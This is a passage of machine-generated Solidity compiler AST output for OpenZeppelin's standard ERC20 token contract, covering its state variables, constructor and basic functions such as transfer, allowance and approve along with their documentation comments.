26,"src":"232:48:2","symbolAliases":[{"foreign":{"id":291,"name":"Context","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":925,"src":"240:7:2","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/interfaces/draft-IERC6093.sol","file":"../../interfaces/draft-IERC6093.sol","id":294,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":800,"sourceUnit":285,"src":"281:65:2","symbolAliases":[{"foreign":{"id":293,"name":"IERC20Errors","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":189,"src":"289:12:2","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":true,"baseContracts":[{"baseName":{"id":296,"name":"Context","nameLocations":["1428:7:2"],"nodeType":"IdentifierPath","referencedDeclaration":925,"src":"1428:7:2"},"id":297,"nodeType":"InheritanceSpecifier","src":"1428:7:2"},{"baseName":{"id":298,"name":"IERC20","nameLocations":["1437:6:2"],"nodeType":"IdentifierPath","referencedDeclaration":877,"src":"1437:6:2"},"id":299,"nodeType":"InheritanceSpecifier","src":"1437:6:2"},{"baseName":{"id":300,"name":"IERC20Metadata","nameLocations":["1445:14:2"],"nodeType":"IdentifierPath","referencedDeclaration":903,"src":"1445:14:2"},"id":301,"nodeType":"InheritanceSpecifier","src":"1445:14:2"},{"baseName":{"id":302,"name":"IERC20Errors","nameLocations":["1461:12:2"],"nodeType":"IdentifierPath","referencedDeclaration":189,"src":"1461:12:2"},"id":303,"nodeType":"InheritanceSpecifier","src":"1461:12:2"}],"canonicalName":"ERC20","contractDependencies":[],"contractKind":"contract","documentation":{"id":295,"nodeType":"StructuredDocumentation","src":"348:1052:2","text":" @dev Implementation of the {IERC20} interface.\n This implementation is agnostic to the way tokens are created. This means\n that a supply mechanism has to be added in a derived contract using {_mint}.\n TIP: For a detailed writeup see our guide\n https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n to implement supply mechanisms].\n The default value of {decimals} is 18. To change this, you should override\n this function so it returns a different value.\n We have followed general OpenZeppelin Contracts guidelines: functions revert\n instead returning `false` on failure. This behavior is nonetheless\n conventional and does not conflict with the expectations of ERC20\n applications.\n Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n This allows applications to reconstruct the allowance for all accounts just\n by listening to said events. Other implementations of the EIP may not emit\n these events, as it isn't required by the specification."},"fullyImplemented":true,"id":799,"linearizedBaseContracts":[799,189,903,877,925],"name":"ERC20","nameLocation":"1419:5:2","nodeType":"ContractDefinition","nodes":[{"constant":false,"id":307,"mutability":"mutable","name":"_balances","nameLocation":"1524:9:2","nodeType":"VariableDeclaration","scope":799,"src":"1480:53:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"typeName":{"id":306,"keyName":"account","keyNameLocation":"1496:7:2","keyType":{"id":304,"name":"address","nodeType":"ElementaryTypeName","src":"1488:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1480:35:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"valueName":"","valueNameLocation":"-1:-1:-1","valueType":{"id":305,"name":"uint256","nodeType":"ElementaryTypeName","src":"1507:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}},"visibility":"private"},{"constant":false,"id":313,"mutability":"mutable","name":"_allowances","nameLocation":"1612:11:2","nodeType":"VariableDeclaration","scope":799,"src":"1540:83:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$","typeString":"mapping(address => mapping(address => uint256))"},"typeName":{"id":312,"keyName":"account","keyNameLocation":"1556:7:2","keyType":{"id":308,"name":"address","nodeType":"ElementaryTypeName","src":"1548:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1540:63:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$","typeString":"mapping(address => mapping(address => uint256))"},"valueName":"","valueNameLocation":"-1:-1:-1","valueType":{"id":311,"keyName":"spender","keyNameLocation":"1583:7:2","keyType":{"id":309,"name":"address","nodeType":"ElementaryTypeName","src":"1575:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1567:35:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"valueName":"","valueNameLocation":"-1:-1:-1","valueType":{"id":310,"name":"uint256","nodeType":"ElementaryTypeName","src":"1594:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}}},"visibility":"private"},{"constant":false,"id":315,"mutability":"mutable","name":"_totalSupply","nameLocation":"1646:12:2","nodeType":"VariableDeclaration","scope":799,"src":"1630:28:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":314,"name":"uint256","nodeType":"ElementaryTypeName","src":"1630:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":317,"mutability":"mutable","name":"_name","nameLocation":"1680:5:2","nodeType":"VariableDeclaration","scope":799,"src":"1665:20:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string"},"typeName":{"id":316,"name":"string","nodeType":"ElementaryTypeName","src":"1665:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"private"},{"constant":false,"id":319,"mutability":"mutable","name":"_symbol","nameLocation":"1706:7:2","nodeType":"VariableDeclaration","scope":799,"src":"1691:22:2","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string"},"typeName":{"id":318,"name":"string","nodeType":"ElementaryTypeName","src":"1691:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"private"},{"body":{"id":335,"nodeType":"Block","src":"1952:57:2","statements":[{"expression":{"id":329,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":327,"name":"_name","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":317,"src":"1962:5:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":328,"name":"name_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":322,"src":"1970:5:2","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"src":"1962:13:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"id":330,"nodeType":"ExpressionStatement","src":"1962:13:2"},{"expression":{"id":333,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":331,"name":"_symbol","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":319,"src":"1985:7:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":332,"name":"symbol_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":324,"src":"1995:7:2","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"src":"1985:17:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"id":334,"nodeType":"ExpressionStatement","src":"1985:17:2"}]},"documentation":{"id":320,"nodeType":"StructuredDocumentation","src":"1720:171:2","text":" @dev Sets the values for {name} and {symbol}.\n All two of these values are immutable: they can only be set once during\n construction."},"id":336,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":325,"nodeType":"ParameterList","parameters":[{"constant":false,"id":322,"mutability":"mutable","name":"name_","nameLocation":"1922:5:2","nodeType":"VariableDeclaration","scope":336,"src":"1908:19:2","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":321,"name":"string","nodeType":"ElementaryTypeName","src":"1908:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":324,"mutability":"mutable","name":"symbol_","nameLocation":"1943:7:2","nodeType":"VariableDeclaration","scope":336,"src":"1929:21:2","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":323,"name":"string","nodeType":"ElementaryTypeName","src":"1929:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"1907:44:2"},"returnParameters":{"id":326,"nodeType":"ParameterList","parameters":[],"src":"1952:0:2"},"scope":799,"src":"1896:113:2","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"baseFunctions":[890],"body":{"id":344,"nodeType":"Block","src":"2134:29:2","statements":[{"expression":{"id":342,"name":"_name","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":317,"src":"2151:5:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"functionReturnParameters":341,"id":343,"nodeType":"Return","src":"2144:12:2"}]},"documentation":{"id":337,"nodeType":"StructuredDocumentation","src":"2015:54:2","text":" @dev Returns the name of the token."},"functionSelector":"06fdde03","id":345,"implemented":true,"kind":"function","modifiers":[],"name":"name","nameLocation":"2083:4:2","nodeType":"FunctionDefinition","parameters":{"id":338,"nodeType":"ParameterList","parameters":[],"src":"2087:2:2"},"returnParameters":{"id":341,"nodeType":"ParameterList","parameters":[{"constant":false,"id":340,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":345,"src":"2119:13:2","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":339,"name":"string","nodeType":"ElementaryTypeName","src":"2119:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2118:15:2"},"scope":799,"src":"2074:89:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[896],"body":{"id":353,"nodeType":"Block","src":"2338:31:2","statements":[{"expression":{"id":351,"name":"_symbol","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":319,"src":"2355:7:2","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"functionReturnParameters":350,"id":352,"nodeType":"Return","src":"2348:14:2"}]},"documentation":{"id":346,"nodeType":"StructuredDocumentation","src":"2169:102:2","text":" @dev Returns the symbol of the token, usually a shorter version of the\n name."},"functionSelector":"95d89b41","id":354,"implemented":true,"kind":"function","modifiers":[],"name":"symbol","nameLocation":"2285:6:2","nodeType":"FunctionDefinition","parameters":{"id":347,"nodeType":"ParameterList","parameters":[],"src":"2291:2:2"},"returnParameters":{"id":350,"nodeType":"ParameterList","parameters":[{"constant":false,"id":349,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":354,"src":"2323:13:2","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":348,"name":"string","nodeType":"ElementaryTypeName","src":"2323:6:2","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2322:15:2"},"scope":799,"src":"2276:93:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[902],"body":{"id":362,"nodeType":"Block","src":"3058:26:2","statements":[{"expression":{"hexValue":"3138","id":360,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3075:2:2","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"functionReturnParameters":359,"id":361,"nodeType":"Return","src":"3068:9:2"}]},"documentation":{"id":355,"nodeType":"StructuredDocumentation","src":"2375:622:2","text":" @dev Returns the number of decimals used to get its user representation.\n For example, if `decimals` equals `2`, a balance of `505` tokens should\n be displayed to a user as `5.05` (`505 / 10 ** 2`).\n Tokens usually opt for a value of 18, imitating the relationship between\n Ether and Wei. This is the default value returned by this function, unless\n it's overridden.\n NOTE: This information is only used for _display_ purposes: it in\n no way affects any of the arithmetic of the contract, including\n {IERC20-balanceOf} and {IERC20-transfer}."},"functionSelector":"313ce567","id":363,"implemented":true,"kind":"function","modifiers":[],"name":"decimals","nameLocation":"3011:8:2","nodeType":"FunctionDefinition","parameters":{"id":356,"nodeType":"ParameterList","parameters":[],"src":"3019:2:2"},"returnParameters":{"id":359,"nodeType":"ParameterList","parameters":[{"constant":false,"id":358,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":363,"src":"3051:5:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":357,"name":"uint8","nodeType":"ElementaryTypeName","src":"3051:5:2","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"src":"3050:7:2"},"scope":799,"src":"3002:82:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[826],"body":{"id":371,"nodeType":"Block","src":"3205:36:2","statements":[{"expression":{"id":369,"name":"_totalSupply","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":315,"src":"3222:12:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":368,"id":370,"nodeType":"Return","src":"3215:19:2"}]},"documentation":{"id":364,"nodeType":"StructuredDocumentation","src":"3090:49:2","text":" @dev See {IERC20-totalSupply}."},"functionSelector":"18160ddd","id":372,"implemented":true,"kind":"function","modifiers":[],"name":"totalSupply","nameLocation":"3153:11:2","nodeType":"FunctionDefinition","parameters":{"id":365,"nodeType":"ParameterList","parameters":[],"src":"3164:2:2"},"returnParameters":{"id":368,"nodeType":"ParameterList","parameters":[{"constant":false,"id":367,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":372,"src":"3196:7:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":366,"name":"uint256","nodeType":"ElementaryTypeName","src":"3196:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3195:9:2"},"scope":799,"src":"3144:97:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[834],"body":{"id":384,"nodeType":"Block","src":"3373:42:2","statements":[{"expression":{"baseExpression":{"id":380,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":307,"src":"3390:9:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":382,"indexExpression":{"id":381,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":375,"src":"3400:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3390:18:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":379,"id":383,"nodeType":"Return","src":"3383:25:2"}]},"documentation":{"id":373,"nodeType":"StructuredDocumentation","src":"3247:47:2","text":" @dev See {IERC20-balanceOf}."},"functionSelector":"70a08231","id":385,"implemented":true,"kind":"function","modifiers":[],"name":"balanceOf","nameLocation":"3308:9:2","nodeType":"FunctionDefinition","parameters":{"id":376,"nodeType":"ParameterList","parameters":[{"constant":false,"id":375,"mutability":"mutable","name":"account","nameLocation":"3326:7:2","nodeType":"VariableDeclaration","scope":385,"src":"3318:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":374,"name":"address","nodeType":"ElementaryTypeName","src":"3318:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3317:17:2"},"returnParameters":{"id":379,"nodeType":"ParameterList","parameters":[{"constant":false,"id":378,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":385,"src":"3364:7:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":377,"name":"uint256","nodeType":"ElementaryTypeName","src":"3364:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3363:9:2"},"scope":799,"src":"3299:116:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[844],"body":{"id":408,"nodeType":"Block","src":"3685:103:2","statements":[{"assignments":[396],"declarations":[{"constant":false,"id":396,"mutability":"mutable","name":"owner","nameLocation":"3703:5:2","nodeType":"VariableDeclaration","scope":408,"src":"3695:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":395,"name":"address","nodeType":"ElementaryTypeName","src":"3695:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":399,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"id":397,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"3711:10:2","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":398,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3711:12:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"3695:28:2"},{"expression":{"arguments":[{"id":401,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":396,"src":"3743:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":402,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":388,"src":"3750:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":403,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":390,"src":"3754:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":400,"name":"_transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":529,"src":"3733:9:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":404,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3733:27:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":405,"nodeType":"ExpressionStatement","src":"3733:27:2"},{"expression":{"hexValue":"74727565","id":406,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"3777:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"functionReturnParameters":394,"id":407,"nodeType":"Return","src":"3770:11:2"}]},"documentation":{"id":386,"nodeType":"StructuredDocumentation","src":"3421:184:2","text":" @dev See {IERC20-transfer}.\n Requirements:\n - `to` cannot be the zero address.\n - the caller must have a balance of at least `value`."},"functionSelector":"a9059cbb","id":409,"implemented":true,"kind":"function","modifiers":[],"name":"transfer","nameLocation":"3619:8:2","nodeType":"FunctionDefinition","parameters":{"id":391,"nodeType":"ParameterList","parameters":[{"constant":false,"id":388,"mutability":"mutable","name":"to","nameLocation":"3636:2:2","nodeType":"VariableDeclaration","scope":409,"src":"3628:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":387,"name":"address","nodeType":"ElementaryTypeName","src":"3628:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":390,"mutability":"mutable","name":"value","nameLocation":"3648:5:2","nodeType":"VariableDeclaration","scope":409,"src":"3640:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":389,"name":"uint256","nodeType":"ElementaryTypeName","src":"3640:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3627:27:2"},"returnParameters":{"id":394,"nodeType":"ParameterList","parameters":[{"constant":false,"id":393,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":409,"src":"3679:4:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":392,"name":"bool","nodeType":"ElementaryTypeName","src":"3679:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"3678:6:2"},"scope":799,"src":"3610:178:2","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[854],"body":{"id":425,"nodeType":"Block","src":"3935:51:2","statements":[{"expression":{"baseExpression":{"baseExpression":{"id":419,"name":"_allowances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":313,"src":"3952:11:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$","typeString":"mapping(address => mapping(address => uint256))"}},"id":421,"indexExpression":{"id":420,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":412,"src":"3964:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3952:18:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":423,"indexExpression":{"id":422,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":414,"src":"3971:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"3952:27:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":418,"id":424,"nodeType":"Return","src":"3945:34:2"}]},"documentation":{"id":410,"nodeType":"StructuredDocumentation","src":"3794:47:2","text":" @dev See {IERC20-allowance}."},"functionSelector":"dd62ed3e","id":426,"implemented":true,"kind":"function","modifiers":[],"name":"allowance","nameLocation":"3855:9:2","nodeType":"FunctionDefinition","parameters":{"id":415,"nodeType":"ParameterList","parameters":[{"constant":false,"id":412,"mutability":"mutable","name":"owner","nameLocation":"3873:5:2","nodeType":"VariableDeclaration","scope":426,"src":"3865:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":411,"name":"address","nodeType":"ElementaryTypeName","src":"3865:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":414,"mutability":"mutable","name":"spender","nameLocation":"3888:7:2","nodeType":"VariableDeclaration","scope":426,"src":"3880:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":413,"name":"address","nodeType":"ElementaryTypeName","src":"3880:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3864:32:2"},"returnParameters":{"id":418,"nodeType":"ParameterList","parameters":[{"constant":false,"id":417,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":426,"src":"3926:7:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":416,"name":"uint256","nodeType":"ElementaryTypeName","src":"3926:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3925:9:2"},"scope":799,"src":"3846:140:2","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[864],"body":{"id":449,"nodeType":"Block","src":"4372:107:2","statements":[{"assignments":[437],"declarations":[{"constant":false,"id":437,"mutability":"mutable","name":"owner","nameLocation":"4390:5:2","nodeType":"VariableDeclaration","scope":449,"src":"4382:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":436,"name":"address","nodeType":"ElementaryTypeName","src":"4382:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":440,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"id":438,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"4398:10:2","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":439,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4398:12:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"4382:28:2"},{"expression":{"arguments":[{"id":442,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":437,"src":"4429:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":443,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":429,"src":"4436:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":444,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":431,"src":"4445:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":441,"name":"_approve","nodeType":"Identifier","overloadedDeclarations":[690,750],"referencedDeclaration":690,"src":"4420:8:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":445,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4420:31:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":446,"nodeType":"ExpressionStatement","src":"4420:31:2"},{"expression":{"hexValue":"74727565","id":447,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"4468:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"functionReturnParameters":435,"id":448,"nodeType":"Return","src":"4461:11:2"}]},"documentation":{"id":427,"nodeType":"StructuredDocumentation","src":"3992:296:2","text":" @dev See {IERC20-approve}.\n NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n `transferFrom`. This is semantically equivalent to an infinite approval.\n Requirements:\n - `spender` cannot be the zero address."},"functionSelector":"095ea7b3","id":450,"implemented":true,"kind":"function","modifiers":[],"name":"approve","nameLocation":"4302:7:2","nodeType":"FunctionDefinition","parameters":{"id":432,"nodeType":"ParameterList","parameters":[{"constant":false,"id":429,"mutability":"mutable","name":"spender","nameLocation":"4318:7:2","nodeType":"VariableDeclaration","scope":450,"src":"4310:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":428,"name":"address","nodeType":"ElementaryTypeName","src":"4310:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":431,"mutability":"mutable","name":"value","nameLocation":"4335:5:2","nodeType":"VariableDeclaration","scope":450,"src":"4327:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":430,"name":"uint256","nodeType":"ElementaryTypeName","src":"4327:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4309:32:2"},"returnParameters":{"id":435,"nodeType":"ParameterList","parameters":[{"constant":false,"id":434,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":450,"src":"4366:4:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":433,"name":"bool","nodeType":"ElementaryTypeName","src":"4366:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4365:6:2"},"scope":799,"src":"4293:186:2","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"baseFunctions":[876],"body":{"id":481,